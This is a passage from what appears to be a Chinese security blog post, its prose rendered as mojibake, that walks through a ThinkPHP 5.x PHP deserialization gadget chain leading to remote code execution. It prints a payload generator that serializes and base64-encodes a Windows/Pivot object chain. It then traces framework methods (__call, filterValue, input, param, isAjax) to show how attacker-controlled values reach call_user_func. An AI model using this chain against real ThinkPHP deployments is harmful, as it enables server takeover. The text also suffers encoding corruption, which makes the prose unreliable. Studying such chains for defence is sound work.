class="hljs-title">Windows</span></span>&#123;<br>        <span class="hljs-keyword">private</span> <span class="hljs-variable">$files</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;files[] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>&#123;<br>    <span class="hljs-title class_">class</span> <span class="hljs-title class_">Pivot</span>&#123;<br>        <span class="hljs-title class_">protected</span> $<span class="hljs-title class_">append</span> = [];<br>        <span class="hljs-keyword">protected</span> <span class="hljs-variable">$data</span> = [];<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;append = [<span class="hljs-string">&#x27;0.&#x27;</span>];<br>            <span class="hljs-variable language_">$this</span>-&gt;data = [<span class="hljs-string">&#x27;0&#x27;</span> =&gt; <span class="hljs-string">&#x27;123&#x27;</span>];<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title class_">use</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">process</span>\<span class="hljs-title class_">pipes</span>\<span class="hljs-title class_">Windows</span>;<br><br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Windows</span>()));<br>&#125;<br></code></pre></td></tr></table></figure><p>å‘ç°æ­¤æ—¶æˆåŠŸè¿›å…¥è¯­å¥<code>$relation-&gt;visible([$attr]);</code></p><p>![](img&#x2F;æˆªå±2023-10-08 13.27.17.png)</p><p>å¹¶ä¸”<code>$relation</code>çš„å€¼ä¹ŸçŸ¥é“ï¼Œå°±æ˜¯æˆ‘ä»¬è‡ªå·±è®¾ç½®çš„<code>123</code>ã€‚é‚£ä¹ˆå¾…ä¼šå°±å¯ä»¥æŠŠ<code>123</code>æ›¿æ¢ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œåˆ©ç”¨è¯­å¥<code>$relation-&gt;visible([$attr]);</code>è°ƒç”¨å…¶ä»–ç±»çš„<code>visible</code>æ–¹æ³•ï¼Œæˆ–è€…è°ƒç”¨<code>__call</code>æ–¹æ³•ã€‚</p><p>ç»è¿‡æ’æŸ¥åï¼Œå‘ç°å…¶ä»–ç±»çš„<code>visible</code>æ–¹æ³•éƒ½ä¸å¥½åˆ©ç”¨ï¼Œäºæ˜¯è€ƒè™‘<code>__call</code>æ–¹æ³•ï¼Œ</p><p>è¿™é‡Œé€‰æ‹©<code>think\Request</code>ç±»çš„<code>__callæ–¹æ³•</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$method</span>, <span class="hljs-variable">$args</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$method</span>, <span class="hljs-variable">$this</span>-&gt;hook)) &#123;<br>        <span class="hljs-title function_ invoke__">array_unshift</span>(<span class="hljs-variable">$args</span>, <span class="hljs-variable">$this</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$this</span>-&gt;hook[<span class="hljs-variable">$method</span>], <span class="hljs-variable">$args</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&#x27;method not exists:&#x27;</span> . <span class="hljs-built_in">static</span>::<span class="hljs-variable language_">class</span> . <span class="hljs-string">&#x27;-&gt;&#x27;</span> . <span class="hljs-variable">$method</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>çœ‹åˆ°äº†<code>call_user_func_array</code>å‡½æ•°ï¼Œä½†æ˜¯ä¾ç„¶ä¸èƒ½é«˜å…´å¤ªæ—©ã€‚</p><p>å½“æˆ‘ä»¬è¿›å…¥æ­¤æ–¹æ³•æ—¶ï¼Œ<code>$method</code>æ˜¯<code>visible</code>ï¼Œ<code>$args</code>æ˜¯<code>null</code>ï¼Œå› ä¸º<code>$this-&gt;hook</code>å¯æ§ï¼Œæ‰€ä»¥æœ€å¼€å§‹çš„<code>if</code>æ¡ä»¶å®¹æ˜“è¿‡ï¼Œä½†å…³é”®æ˜¯<code> array_unshift($args, $this)</code>,è¿™æ¡è¯­å¥ä¼šæŠŠ<code>$this</code>æ’å…¥<code>args</code>çš„é¦–ä½ï¼Œè®©<code>args</code>ç”±ç©ºæ•°ç»„å˜ä¸º<code>[0] =&gt; &quot;think\Request&quot;</code>ï¼Œè¿™å°±ä½¿å¾—<code>call_user_func_array($this-&gt;hook[$method], $args)</code>çš„å‚æ•°ä¸å¯æ§ï¼Œå°±æ²¡é‚£ä¹ˆå®¹æ˜“è°ƒç”¨<code>system</code>å‡½æ•°ç›´æ¥RCEäº†ã€‚</p><p>ä½†å¥½åœ¨<code>$this-&gt;hook</code>æ˜¯å¯æ§çš„ï¼Œ<code>$method</code>æ˜¯å·²çŸ¥çš„ï¼Œä¹Ÿå°±æ„å‘³ç€<code>$this-&gt;hook[$method]</code>æ˜¯å¯æ§ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»ä½•ä¸€ä¸ªå‡½æ•°ï¼Œåªä¸è¿‡å‚æ•°ä¸å¯æ§ã€‚</p><p>æ¢³ç†ä¸€ä¸‹ç›®å‰çš„æˆæœï¼š</p><p>æˆ‘ä»¬ä»¥<code>Windows</code>ç±»çš„<code>__destruct()</code>ä¸ºå…¥å£ï¼Œåˆ©ç”¨å…¶ä¸­<code>removeFiles()</code>é‡Œçš„<code>file_exists()</code>å‡½æ•°ï¼Œæ­¤å‡½æ•°ä¼šæŠŠå¯¹è±¡å½“å­—ç¬¦ä¸²ä½¿ç”¨ï¼Œäºæ˜¯åˆ©ç”¨<code>trait Conversion</code>çš„<code>__toString()</code>ï¼Œä»¥å®ç°äº†æ­¤traitçš„<code>think\model\Pivot</code>æ¥å®ä¾‹åŒ–å¯¹è±¡ï¼Œå¹¶ç»è¿‡è°ƒè¯•æˆåŠŸè¿›å…¥æ­¤è¯­å¥<code>call_user_func_array($this-&gt;hook[$method], $args);</code></p><h2 id="filterValue"><a href="#filterValue" class="headerlink" title="filterValue"></a>filterValue</h2><p>ç°åœ¨æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ä¸€ä¸ªå‡½æ•°ï¼Œä½†é—®é¢˜å°±åœ¨äºå‚æ•°ä¸å¯æ§ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦å¦å¯»ä»–è·¯ã€‚</p><p>æˆ‘ä»¬æŠŠç›®å…‰èšç„¦äºè¯¥ç±»çš„<code>filterValue</code>æ–¹æ³•ï¼Œäº‹å®ä¸Š<code>ThinkPHP</code>è®¸å¤šRCEéƒ½ä¸æ­¤æ–¹æ³•æœ‰å…³</p><p>æ­¤æ–¹æ³•ä»£ç ä¹Ÿå¾ˆå¤šï¼Œä½†å…³é”®åªåœ¨äºå‰é¢å‡ å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filterValue</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$filters</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$default</span> = <span class="hljs-title function_ invoke__">array_pop</span>(<span class="hljs-variable">$filters</span>);<br><br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filters</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$filter</span>)) &#123;<br>            <span class="hljs-comment">// è°ƒç”¨å‡½æ•°æˆ–è€…æ–¹æ³•è¿‡æ»¤</span><br>            <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$value</span>);<br>          Â·Â·Â·Â·Â·Â·Â·<br></code></pre></td></tr></table></figure><p>è¦åˆ©ç”¨çš„æ–¹æ³•å°±æ˜¯è¿™é‡Œçš„<code>$value = call_user_func($filter, $value);</code>æ˜¯çš„ï¼Œè™½ç„¶ä¹‹å‰æ‰¾åˆ°çš„<code>call_user_func_array</code>å¾ˆé¦™ï¼Œä½†æ˜¯å¥ˆä½•æ— æ³•æ§åˆ¶å‚æ•°ï¼Œåªèƒ½å½“åšè·³æ¿ï¼Œè½¬å¯»å…¶ä»–çš„<code>call_user_func</code>ï¼Œäºæ˜¯ä¹å°±åˆ©ç”¨<code>filterValue</code>é‡Œé¢çš„<code>call_user_func</code></p><p>ä½†é—®é¢˜åˆåœ¨äºï¼Œè¿™é‡Œçš„å‚æ•°<code>$filter</code>å’Œ<code>$value</code>ä»ç„¶ä¸å¯æ§ï¼Œè¿˜å¾—ç»§ç»­æ‰¾ï¼Œçœ‹æœ‰æ²¡æœ‰å…¶ä»–æ–¹æ³•ä½¿ç”¨äº†æ­¤å‡½æ•°</p><h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>ç»§ç»­å¯»æ‰¾åˆ°æ–¹æ³•<code>input()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">input</span>(<span class="hljs-params"><span class="hljs-variable">$data</span> = [], <span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"> </span>&#123;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$name</span>) &#123;<br>         <span class="hljs-comment">// è·å–åŸå§‹æ•°æ®</span><br>         <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>     &#125;<br><br>     <span class="hljs-variable">$name</span> = (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$name</span>;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-string">&#x27;&#x27;</span> != <span class="hljs-variable">$name</span>) &#123;<br>         <span class="hljs-comment">// è§£æname</span><br>         <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$name</span>, <span class="hljs-string">&#x27;/&#x27;</span>)) &#123;<br>             <span class="hljs-keyword">list</span>(<span class="hljs-variable">$name</span>, <span class="hljs-variable">$type</span>) = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-variable">$name</span>);<br>         &#125;<br><br>         <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getData</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$name</span>);<br><br>         <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$data</span>)) &#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-variable">$default</span>;<br>         &#125;<br><br>         <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$data</span>)) &#123;<br>             <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>         &#125;<br>     &#125;<br><br>     <span class="hljs-comment">// è§£æè¿‡æ»¤å™¨</span><br>     <span class="hljs-variable">$filter</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFilter</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$default</span>);<br><br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br>         <span class="hljs-title function_ invoke__">array_walk_recursive</span>(<span class="hljs-variable">$data</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">&#x27;filterValue&#x27;</span>], <span class="hljs-variable">$filter</span>);<br>         <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">version_compare</span>(PHP_VERSION, <span class="hljs-string">&#x27;7.1.0&#x27;</span>, <span class="hljs-string">&#x27;&lt;&#x27;</span>)) &#123;<br>             <span class="hljs-comment">// æ¢å¤PHPç‰ˆæœ¬ä½äº 7.1 æ—¶ array_walk_recursive ä¸­æ¶ˆè€—çš„å†…éƒ¨æŒ‡é’ˆ</span><br>             <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">arrayReset</span>(<span class="hljs-variable">$data</span>);<br>         &#125;<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filterValue</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$name</span>, <span class="hljs-variable">$filter</span>);<br>     &#125;<br><br>     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$type</span>) &amp;&amp; <span class="hljs-variable">$data</span> !== <span class="hljs-variable">$default</span>) &#123;<br>         <span class="hljs-comment">// å¼ºåˆ¶ç±»å‹è½¬æ¢</span><br>         <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">typeCast</span>(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$type</span>);<br>     &#125;<br><br>     <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br> &#125;<br><br></code></pre></td></tr></table></figure><p>ä»£ç é‡ä¸­è§„ä¸­çŸ©ï¼Œè¿™é‡Œçš„å…³é”®åœ¨äº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filter</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getFilter</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-variable">$default</span>);<br><br>       <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br>           <span class="hljs-title function_ invoke__">array_walk_recursive</span>(<span class="hljs-variable">$data</span>, [<span class="hljs-variable">$this</span>, <span class="hljs-string">&#x27;filterValue&#x27;</span>], <span class="hljs-variable">$filter</span>);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œä¼šè°ƒç”¨ä¹‹å‰çš„<code>filterValue</code>å‡½æ•°ï¼Œå¹¶ä¸”<code>$filter</code>æ˜¯ç”±<code> $filter = $this-&gt;getFilter($filter, $default)</code>å¾—åˆ°ï¼Œçœ‹ä¸€ä¸‹å‡½æ•°<code>getFilter()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFilter</span>(<span class="hljs-params"><span class="hljs-variable">$filter</span>, <span class="hljs-variable">$default</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$filter</span>)) &#123;<br>        <span class="hljs-variable">$filter</span> = [];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$filter</span> = <span class="hljs-variable">$filter</span> ?: <span class="hljs-variable language_">$this</span>-&gt;filter;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$filter</span>) &amp;&amp; <span class="hljs-literal">false</span> === <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$filter</span>, <span class="hljs-string">&#x27;/&#x27;</span>)) &#123;<br>            <span class="hljs-variable">$filter</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;,&#x27;</span>, <span class="hljs-variable">$filter</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$filter</span> = (<span class="hljs-keyword">array</span>) <span class="hljs-variable">$filter</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-variable">$filter</span>[] = <span class="hljs-variable">$default</span>;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$filter</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•å®¡è®¡ä¸€ä¸‹å°±çŸ¥é“è¿™ä¸ªå‡½æ•°å°±æ˜¯è¿”å›<code>$this-&gt;filter</code></p><p>é‚£ä¹ˆæ­¤æ—¶<code>$this-&gt;filter</code>ç®—æ˜¯å¯æ§äº†</p><p>ä½†æ˜¯è¿™é‡Œè¿˜æœ‰é—®é¢˜æ²¡æœ‰è§£å†³ï¼Œå°±æ˜¯<code>  array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);</code>è¿™é‡Œé¢çš„<code>$data</code>ä»ç„¶ä¸å¯æ§ï¼Œå°±éœ€è¦ç»§ç»­æ‰¾å‡½æ•°ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å“ªä¸ªæ–¹æ³•è°ƒç”¨<code>input</code></p><h2 id="param"><a href="#param" class="headerlink" title="param"></a>param</h2><p>ç»è¿‡æŸ¥æ‰¾ï¼Œå‘ç°<code>$this-&gt;param()</code>æ–¹æ³•å¯ä»¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">param</span>(<span class="hljs-params"><span class="hljs-variable">$name</span> = <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span> = <span class="hljs-literal">null</span>, <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;&#x27;</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;mergeParam) &#123;<br>        <span class="hljs-variable">$method</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">method</span>(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-comment">// è‡ªåŠ¨è·å–è¯·æ±‚å˜é‡</span><br>        <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$method</span>) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;POST&#x27;</span>:<br>                <span class="hljs-variable">$vars</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">post</span>(<span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;PUT&#x27;</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;DELETE&#x27;</span>:<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;PATCH&#x27;</span>:<br>                <span class="hljs-variable">$vars</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">put</span>(<span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-variable">$vars</span> = [];<br>        &#125;<br><br>        <span class="hljs-comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span><br>        <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-literal">false</span>), <span class="hljs-variable">$vars</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-literal">false</span>));<br><br>        <span class="hljs-variable language_">$this</span>-&gt;mergeParam = <span class="hljs-literal">true</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === <span class="hljs-variable">$name</span>) &#123;<br>        <span class="hljs-comment">// è·å–åŒ…å«æ–‡ä»¶ä¸Šä¼ ä¿¡æ¯çš„æ•°ç»„</span><br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file</span>();<br>        <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$file</span>) ? <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$file</span>) : <span class="hljs-variable language_">$this</span>-&gt;param;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-variable">$data</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$default</span>, <span class="hljs-variable">$filter</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">input</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$name</span>, <span class="hljs-variable">$default</span>, <span class="hljs-variable">$filter</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ç•™æ„æœ€åä¸€å¥çš„<code> $this-&gt;input($this-&gt;param, $name, $default, $filter);</code>ï¼Œè¿™é‡Œå°±èƒ½æ§åˆ¶<code>$this-&gt;param</code>å‚æ•°ï¼Œè¿›è€Œå¯ä»¥æ§åˆ¶<code>input()</code>é‡Œçš„<code>$data</code>å‚æ•°ï¼Œ</p><p>ä½†è¦ç•™æ„åœ¨è¿™ä¹‹å‰è¿˜æœ‰è¿™ä¹ˆä¸€æ®µ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// å½“å‰è¯·æ±‚å‚æ•°å’ŒURLåœ°å€ä¸­çš„å‚æ•°åˆå¹¶</span><br>            <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-title function_ invoke__">array_merge</span>(<span class="hljs-variable">$this</span>-&gt;param, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-literal">false</span>), <span class="hljs-variable">$vars</span>, <span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">route</span>(<span class="hljs-literal">false</span>));<br></code></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯ä¼šå’Œ<code>get</code>è¯·æ±‚çš„å‚æ•°åˆå¹¶ï¼Œä¸è¿‡è¿™é‡Œä¸æ˜¯ä»€ä¹ˆå¤§äº‹ï¼Œä»ç„¶éƒ½æ˜¯å¯æ§çš„ã€‚</p><p>ç„¶è€Œè¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯è¿™é‡Œçš„<code>$name</code>ä¾ç„¶æ˜¯ä¸å¯æ§çš„ï¼Œä¾æ—§æ˜¯ç±»<code>think\request</code>ï¼Œè¿™å°±å¯¼è‡´<code>input()</code>å‡½æ•°é‡Œé¢<code> $name = (string) $name;</code>ä¼šæŠ¥é”™ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬è¿˜éœ€è¦æ‰¾ä¸€ä¸ªå‡½æ•°æ¥æ§åˆ¶<code>$name</code></p><h2 id="isAjax"><a href="#isAjax" class="headerlink" title="isAjax"></a>isAjax</h2><p>è¿™é‡Œå°±æ‰¾åˆ°äº†<code>$this-&gt;isAjax()</code>æ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isAjax</span>(<span class="hljs-params"><span class="hljs-variable">$ajax</span> = <span class="hljs-literal">false</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$value</span>  = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">server</span>(<span class="hljs-string">&#x27;HTTP_X_REQUESTED_WITH&#x27;</span>);<br>    <span class="hljs-variable">$result</span> = <span class="hljs-string">&#x27;xmlhttprequest&#x27;</span> == <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$value</span>) ? <span class="hljs-literal">true</span> : <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> === <span class="hljs-variable">$ajax</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>    &#125;<br><br>    <span class="hljs-variable">$result</span>           = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">param</span>(<span class="hljs-variable">$this</span>-&gt;config[<span class="hljs-string">&#x27;var_ajax&#x27;</span>]) ? <span class="hljs-literal">true</span> : <span class="hljs-variable">$result</span>;<br>    <span class="hljs-variable language_">$this</span>-&gt;mergeParam = <span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>$result = $this-&gt;param($this-&gt;config[&#39;var_ajax&#39;]) ? true : $result;</code>ï¼Œè¿™é‡Œæˆ‘ä»¬ç»ˆäºå¯ä»¥æ§åˆ¶<code>param()</code>çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚æ•´ä¸ªé“¾å­ä¹Ÿå°±é€šç•…äº†ã€‚</p><p>ç¬¬ä¸€æ³¢æ¢³ç†ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">æˆ‘ä»¬ä»¥`Windows`ç±»çš„`<span class="hljs-title function_ invoke__">__destruct</span>()`ä¸ºå…¥å£ï¼Œåˆ©ç”¨å…¶ä¸­`<span class="hljs-title function_ invoke__">removeFiles</span>()`é‡Œçš„`<span class="hljs-title function_ 